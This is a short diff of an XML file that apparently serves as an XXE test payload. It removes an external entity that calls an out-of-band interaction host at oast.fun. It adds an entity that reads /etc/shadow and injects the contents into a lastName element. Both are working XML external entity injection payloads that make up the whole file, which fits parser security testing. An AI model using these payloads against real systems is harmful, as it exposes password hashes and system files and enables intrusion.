@@ -1,18 +1,6 @@
-<?xml version="1.0" encoding="UTF-8" standalone="no"?>
-<!DOCTYPE root [
-  <!ENTITY xxe SYSTEM "https://cn74qs72vtc0000afhe0gku1mhwyyyyyb.oast.fun/text.txt">
-]>
-<root testAttr="testValue">
-  <foo>&xxe;</foo>
-  <result>
-    <child>data1</child>
-    <child>A1343358848.646</child>
-    <child>
-      <internal>
-        <data>&xxe;</data>
-        <data>two</data>
-        <unique>Z1343358848.646</unique>
-      </internal>
-    </child>
-  </result>
-</root>
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&ent;</lastName>
+</userInfo>
